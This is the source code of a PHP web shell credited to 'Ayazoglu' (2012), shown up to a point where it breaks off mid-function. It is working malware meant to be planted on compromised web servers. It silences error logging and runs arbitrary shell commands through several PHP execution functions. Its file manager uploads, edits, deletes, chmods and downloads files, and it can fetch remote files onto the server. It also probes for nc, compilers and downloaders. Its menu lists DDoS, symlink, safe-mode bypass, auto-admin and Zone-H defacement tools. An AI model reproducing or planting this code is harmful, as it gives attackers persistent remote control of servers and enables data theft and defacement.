<?php

/**
 * @author Ayazoglu
 * @copyright 2012
 */
@define('VERSION','1.0');
@error_reporting(E_ALL ^ E_NOTICE);
@session_start();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);

$host = $_SERVER['HTTP_HOST'];
if(get_magic_quotes_gpc()) {
	function madstripslashes($array) {
		return is_array($array) ? array_map('madstripslashes', $array) : stripslashes($array);
	}
	$_POST = madstripslashes($_POST);
}
$uri = 'http://'.$host.''.$_SERVER['REQUEST_URI'].'';
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
if (strtolower(substr(PHP_OS,0,3))=="win")
    $sys='win';
 else
    $sys='unix';
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);   
    
$cwd = @getcwd();
if($sys == 'win') 
{
    $home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}

if($cwd[strlen($cwd)-1] != '/' )
	$cwd .= '/';
    
    
function madEx($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
$down=@getcwd();
if($sys=="win")
$down.='\\';
else
$down.='/';
if(isset($_POST['rtdown']))
{
$url = $_POST['rtdown'];
$newfname = $down. basename($url);
$file = fopen ($url, "rb");
if ($file) {
  $newf = fopen ($newfname, "wb");
  if ($newf)
  while(!feof($file)) {
    fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
  }
  }

if ($file) {
  fclose($file);
}
if ($newf) {
  fclose($newf);
}
}

    
 
 function madhead()
 {
    if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
 
$freeSpace = @diskfreespace($GLOBALS['cwd']);
$totalSpace = @disk_total_space($GLOBALS['cwd']);
$totalSpace = $totalSpace?$totalSpace:1;        
    
$on="<font color=#0F0> ON </font>";
$of="<font color=red> OFF </font>";
$none="<font color=#0F0> NONE </font>";   
if(function_exists('curl_version'))
    $curl=$on;
else
    $curl=$of;
if(function_exists('mysql_get_client_info'))
    $mysql=$on;
 else
    $mysql=$of;      
if(function_exists('mssql_connect'))
    $mssql=$on;
else
   $mssql=$of; 
		
if(function_exists('pg_connect'))
    $pg=$on;
else
   $pg=$of;    		
if(function_exists('oci_connect'))
   $or=$on;
else
   $or=$of;
if(@ini_get('disable_functions'))
  $disfun=@ini_get('disable_functions');
else
$disfun="All Functions Enable";
if(@ini_get('safe_mode'))
$safe_modes="<font color=red>ON</font>";
else
$safe_modes="<font color=#0F0 >OFF</font>";
if(@ini_get('open_basedir'))
$open_b=@ini_get('open_basedir');
    else
  $open_b=$none;
    

if(@ini_get('safe_mode_exec_dir'))
$safe_exe=@ini_get('safe_mode_exec_dir');
    else
$safe_exe=$none;
if(@ini_get('safe_mode_include_dir'))
   $safe_include=@ini_get('safe_mode_include_dir'); 
else
 $safe_include=$none;
if(!function_exists('posix_getegid')) 
{
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
} else 
{
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}


     $cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a  href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}

$drives = "";
foreach(range('c','z') as $drive)
if(is_dir($drive.':\\'))
$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';





 echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="http://www.ayazoglu.org/favicon.ico" rel="icon" type="image/x-icon"/>
<title>Nothing...</title>
<style type="text/css">
<!--
.whole {
	background-color: #CCC;
	height:auto;
	width: auto;
	margin-top: 10px;
	margin-right: 10px;
	margin-left: 10px;
}
.header {
	height: auto;
	width: auto;
	border: 7px solid #CCC;
	color: #999;
	font-size: 12px;
	font-family: Verdana, Geneva, sans-serif;
	background-color: #000;
}
.header a {color:#0F0; text-decoration:none;}
span {
	font-weight: bolder;
	color: #FFF;
}
#meunlist {
	font-family: Verdana, Geneva, sans-serif;
	color: #FFF;
	background-color: #000;
	width: auto;
	border-right-width: 7px;
	border-left-width: 7px;
	border-top-style: solid;
	border-right-style: solid;
	border-bottom-style: solid;
	border-left-style: solid;
	border-top-color: #CCC;
	border-right-color: #CCC;
	border-bottom-color: #CCC;
	border-left-color: #CCC;
	height: auto;
	font-size: 12px;
	font-weight: bold;
	border-top-width: 0px;
}
  .whole #meunlist ul {
	padding-top: 5px;
	padding-right: 5px;
	padding-bottom: 7px;
	padding-left: 2px;
	text-align:center;
	list-style-type: none;
	margin: 0px;
}
  .whole #meunlist li {
	margin: 0px;
	padding: 0px;
	display: inline;
}
  .whole #meunlist a {
    font-family: arial, sans-serif;
	font-size: 14px;
	text-decoration:none;
	font-weight: bold;
	color: #fff;
	clear: both;
	width: 100px;
	margin-right: -6px;
	padding-top: 3px;
	padding-right: 15px;
	padding-bottom: 3px;
	padding-left: 15px;
	border-right-width: 1px;
	border-right-style: solid;
	border-right-color: #FFF;
}
  .whole #meunlist a:hover {
	color: #000;
	background: #fff;
}

.foot {
	font-family: Verdana, Geneva, sans-serif;
	background-color: #000;
	margin: 0px;
	padding: 0px;
	width: 100%;
	text-align: center;
	font-size: 12px;
	color: #CCC;
	border-right-width: 7px;
	border-left-width: 7px;
    border-bottom-width: 7px;
    border-bottom-style: solid;
    border-right-style: solid;
    border-right-style: solid;
	border-left-style: solid;
	border-top-color: #CCC;
	border-right-color: #CCC;
	border-bottom-color: #CCC;
	border-left-color: #CCC;
}';
if(is_writable($GLOBALS['cwd']))
 {
    echo ".foottable {
    width: 300px;
    font-weight: bold;
    }";}
    else
    {
       echo ".foottable {
    width: 300px;
    font-weight: bold;
    background-color:red;
    }
    .dir {
      background-color:red;  
    }
    "; 
    }    
 echo '.main th{text-align:left;}
 .main a{color: #FFF;}
 .main tr:hover{background-color:red;}
 .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
 .bigarea{ width:99%; height:300px; }   
  </style>

';

echo "<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;

		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	</script>";

    
	echo '
</head>

<body bgcolor="#000000"  leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div class="whole">
<form method=post name=mf style="display:none;">
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>
  <div class="header"><table width="100%" border="0"  align="lift">
  <tr>
    <td width="3%"><span>Uname:</span></td>
    <td colspan="2">'.substr(@php_uname(), 0, 120).'</td>
    </tr>
  <tr>
    <td><span>User:</span></td>
    <td>'. $uid . ' [ ' . $user . ' ] <span>   Group: </span>' . $gid . ' [ ' . $group . ' ] </td>
    <td width="14%" rowspan="8"></td>
	</tr>
  <tr>
    <td><span>PHP:</span></td>
    <td>'.@phpversion(). '   <span>   Safe Mode:'.$safe_modes.'</span></td>
    </tr>
  <tr>
    <td><span>Our IP:</span></td>
    <td>'.@$_SERVER["SERVER_ADDR"].'    <span>Server IP:</span> '.@$_SERVER["REMOTE_ADDR"].'</td>
  </tr>
  <tr>
    <td><span>WEBS:</span></td>
    <td width="76%">';
    
    
      echo '</td>
    </tr>
    <tr>
    <td height="16"><span>HDD:</span></td>
    <td>'.madSize($totalSpace).' <span>Free:</span>' . madSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</td>
    </tr>';
  
     if($GLOBALS['sys']=='unix' )
{
    if(!@ini_get('safe_mode'))
    {
    
    echo '<tr><td height="18" colspan="2"><span>Useful : </span>';
    $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
     foreach($userful as $item)
         if(madWhich($item))
         echo $item.',';
         echo '</td>
         </tr>
          <tr>
          <td height="0" colspan="2"><span>Downloader:</span>';
         
     $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
      foreach($downloaders as $item2)
       if(madWhich($item2))
        echo $item2.',';
        echo '</td>
              </tr>';
         
          }
           else 
           {
         echo '<tr><td height="18" colspan="2"><span>useful:</span>'; 
         echo '--------------</td>
           </tr><td height="0" colspan="2"><span>Downloader: </span>-------------</td>
              </tr>';  
         }
}
else
{
   echo '<tr><td height="18" colspan="2"><span>Window:</span>';
   echo madEx('ver');
   echo '</td>
         </tr> <tr>
        <td height="0" colspan="2"><span>Downloader: </span>-------------</td>
              </tr>'; 
    
}  
    
 
 echo '<tr>
    <td height="16" colspan="2"><span>Disabled functions:</span>'.$disfun.'</td>
  </tr>
  <tr>
    <td height="16" colspan="2"><span>cURL:'.$curl.'  MySQL:'.$mysql.'  MSSQL:'.$mssql.'  PostgreSQL:'.$pg.'  Oracle: </span>'.$or.'</td><td width="15%"></td>
  </tr>
  <tr>
  <td height="11" colspan="3"><span>Open_basedir:'.$open_b.' Safe_mode_exec_dir:'.$safe_exe.'   Safe_mode_include_dir:'.$safe_include.'</td>
  </tr>
  <tr>
    <td height="11"><span>Server </span></td>
    <td colspan="2">'.@getenv('SERVER_SOFTWARE').'</td>
  </tr>';
  if($GLOBALS[sys]=="win")
  {
    echo '<tr>
    <td height="12"><span>DRIVE:</span></td>
    <td colspan="2">'.$drives.'</td>
     </tr>';
  }
  
  echo '<tr>
    <td height="12"><span>PWD:</span></td>
    <td colspan="2">'.$cwd_links.'  <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><font color=red >|CURRENT|</font></a></td>
  </tr>
  </table>
</div>
 <div id="meunlist">
      <ul>
<li><a href="#" onclick="g(\'FilesMan\',null,\'\',\'\',\'\')">HOME</a></li>

<li><a href="#" onclick="g(\'proc\',null,\'\',\'\',\'\')">PROCESS</a></li>
<li><a href="#" onclick="g(\'phpeval\',null,\'\',\'\',\'\')">EVAL</a></li>
<li><a href="#" onclick="g(\'sql\',null,\'\',\'\',\'\')">SQL</a></li>
<li><a href="#" onclick="g(\'hash\',null,\'\',\'\',\'\')">HASH</a></li>
<li><a href="#" onclick="g(\'connect\',null,\'\',\'\',\'\')">CONNECT</a></li>
<li><a href="#" onclick="g(\'zoneh\',null,\'\',\'\',\'\')">ZONE-H</a></li>
<li><a href="#" onclick="g(\'golgeler\',null,\'\',\'\',\'\')">GOLGE</a></li>
<li><a href="#" onclick="g(\'dos\',null,\'\',\'\',\'\')">DDOS</a></li>
<li><a href="#" onclick="g(\'autoadmin\',null,\'\',\'\',\'\')">AUTO ADMIN</a></li>
<li><a href="#" onclick="g(\'safe\',null,\'\',\'\',\'\')">SAFE MODE</a></li>
<li><a href="#" onclick="g(\'symlink\',null,\'\',\'\',\'\')">SYMLINK</a></li>
<li><a href="#" onclick="g(\'spot\',null,\'\',\'\',\'\')">AYAZOGLU</a></li>
<li><a href="#" onclick="g(\'selfrm\',null,\'\',\'\',\'\')">KIll C0de</a></li>
</ul>
    
    </div>
';   
    
}

function madfooter()
{
    
    echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
       <tr>
         <td width='17%'><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>__MK FILE__</span><br><input class='dir'  type=text name=f value=''><input type=submit value='>>'></form></td>
         <td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>__MK DIR__</span><br><input class='dir' type=text name=d value=''><input type=submit value='>>'></form></td>
         <td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);return false;\"><span>__DELETE__</span><br><input class='dir' type=text name=del value=''><input type=submit value='>>'></form></td>
         <td width='19%'><form onsubmit=\"g('FilesTools',null,this.f.value,'chmod');return false;\"><span>__CHMOD__</span><br><input class='dir' type=text name=f value=''><input type=submit value='>>'></form></td>
       </tr>
       <tr>
         <td colspan='2'><form onsubmit='g(null,this.c.value,\"\");return false;'><span>__CHANGE DIR__</span><br><input class='foottable' type=text name=c value='".htmlspecialchars($GLOBALS['cwd'])."'><input type=submit value='>>'></form></td>
         <td colspan='2'><form method='post' ><span>__HTTP DOWNLOAD__</span><br><input class='foottable' type=text name=rtdown value=''><input type=submit value='>>'></form></td>
        </tr>
       <tr>
         <td colspan='4'><form onsubmit=\"g('proc',null,this.c.value);return false;\"><span>__EXECUTE__</span><br><input class='foottable' type=text name=c value=''><input type=submit value='>>'></form></td>
        </tr>
       <tr>
         <td colspan='4'><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
        <span>Upload file:</span><br><input class='toolsInp' type=file name=f><br /><input type=submit value='>>'></form></td>
        </tr> 
      </table>
  </div>
  </body>
</html>
";
    
}
if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
   function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
  function posix_getgrgid($p) {return false;} }

function madWhich($p) {
	$path = madEx('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}



function madSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}


function madPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function madPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . madPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . madPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . madPerms(@fileperms($f)) . '</font>';
}

if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh)))
    		$files[] = $filename;
		return $files;
	}
}


function madFilesMan() {
	madhead();
    echo '<div class=header><script>p1_=p2_=p3_="";</script>';
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload file!";
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					@rmdir($path);
				}
				if(is_dir(@$_POST['p2']))
				deleteDir(@$_POST['p2']);
				else
				@unlink(@$_POST['p2']);
				break;
		default:
                if(!empty($_POST['p1'])) {
					$_SESSION['act'] = @$_POST['p1'];
					$_SESSION['f'] = @$_POST['f'];
					foreach($_SESSION['f'] as $k => $f)
						$_SESSION['f'][$k] = urldecode($f);
					$_SESSION['c'] = @$_POST['c'];
				}
				break;
		}
	}
	$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo '<h3><span>|  Access Denied! |</span></h3></div>';madFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "
<table width='100%' class='main' cellspacing='0' cellpadding='2'  >
<form name=files method=post><tr><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => madPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&& ($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function wsoCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "wsoCmp");
	usort($dirs, "wsoCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" title=' . $f['link'] . '><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td><td>'.(($f['type']=='file')?madSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'<a href="#" onclick="g(\'FilesMan\',null,\'delete\', \''.urlencode($f['name']).'\')"> X </a></td></tr>';
		$l = $l?0:1;
	}
	echo "<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	</form></table></div>";

	
    madfooter();
 }
    
  function madFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
                header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	
   madhead();
	echo '<div class=header>';
	if( !file_exists(@$_POST['p1']) ) {
		echo "<pre class=ml1 style='margin-top:5px'>FILE DOEST NOT EXITS </pre></div>";
		madFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?madSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.madPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a  href=# onclick="g(null,null,null,\''.strtolower($v).'\')"><span>'.((strtolower($v)==@$_POST['p2'])?'<b><span> '.$v.' </span> </b>':$v).' </span></a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
			break;
	}
	echo '</div>';
	madFooter();
}  

function madphpeval()
{
    madhead();
    
    if(isset($_POST['p2']) && ($_POST['p2'] == 'ini')) {
		echo '<div class=header>';
		ob_start();
		$INI=ini_get_all(); 
print '<table border=0><tr>'
	.'<td class="listing"><font class="highlight_txt">Param</td>'
	.'<td class="listing"><font class="highlight_txt">Global value</td>'
	.'<td class="listing"><font class="highlight_txt">Local Value</td>'
	.'<td class="listing"><font class="highlight_txt">Access</td></tr>';
foreach ($INI as $param => $values) 
	print "\n".'<tr>'
		.'<td class="listing"><b>'.$param.'</td>'
		.'<td class="listing">'.$values['global_value'].' </td>'
		.'<td class="listing">'.$values['local_value'].' </td>'
		.'<td class="listing">'.$values['access'].' </td></tr>';
		$tmp = ob_get_clean();
        $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
    
    if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '<div class=header><style>.p {color:#000;}</style>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
    
    if(isset($_POST['p2']) && ($_POST['p2'] == 'exten')) {
		echo '<div class=header>';
		ob_start();
	     $EXT=get_loaded_extensions ();
     print '<table border=0><tr><td class="listing">'
	.implode('</td></tr>'."\n".'<tr><td class="listing">', $EXT)
	.'</td></tr></table>'
	.count($EXT).' extensions loaded';
		
        
        echo '</div><br>';
	}
    
    
